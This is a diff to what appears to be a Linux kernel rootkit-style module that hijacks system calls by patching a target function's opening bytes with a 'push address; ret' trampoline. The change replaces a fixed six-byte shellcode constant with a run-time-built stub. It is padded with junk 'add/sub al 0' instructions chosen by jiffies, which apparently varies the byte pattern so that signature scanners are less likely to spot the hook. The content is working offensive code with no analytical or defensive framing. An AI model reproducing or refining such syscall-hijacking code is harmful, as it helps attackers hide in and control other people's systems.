@@ -7,8 +7,7 @@
 MODULE_LICENSE("GPL");
 
 #define __DEBUG__    (1)
-#define HIJACK_SIZE  (6)
-#define SHELLCODEX86 ("\x68\x00\x00\x00\x00\xc3") /* push addr; ret */
+#define HIJACK_SIZE  (20) // This can be random number 6 <= S < 242
 
 struct sym_hook {
     void *addr;
@@ -155,9 +154,25 @@ void insert_push_ret_instr_syscall(void *target, void *new)
 	struct sym_hook *sa;
 	unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];
 	unsigned long o_cr0;
+    char op_inject[HIJACK_SIZE];
+    unsigned int i;
 
-	memcpy(n_code, SHELLCODEX86, HIJACK_SIZE);
-	*(unsigned long *)&n_code[1] = (unsigned long)new;
+   op_inject[0] = '\x68'; // push addr
+   for (i = 1; i < HIJACK_SIZE - 1; i++)
+   {
+       if ((HIJACK_SIZE - (i + 1)) > 1)
+       {
+           // {add,sub} al 0
+           op_inject[i] = (jiffies % 2 ? '\x04' : '\x2c');
+           op_inject[++i] = '\x00';
+       }
+       else
+           op_inject[i] = '\x90'; // xchg eax, eax
+   }
+   op_inject[HIJACK_SIZE - 1] = '\xc3'; // ret
+
+   memcpy(n_code, op_inject, HIJACK_SIZE);
+     *(unsigned long *)&n_code[1] = (unsigned long)new;
 
 	memcpy(o_code, target, HIJACK_SIZE);
 
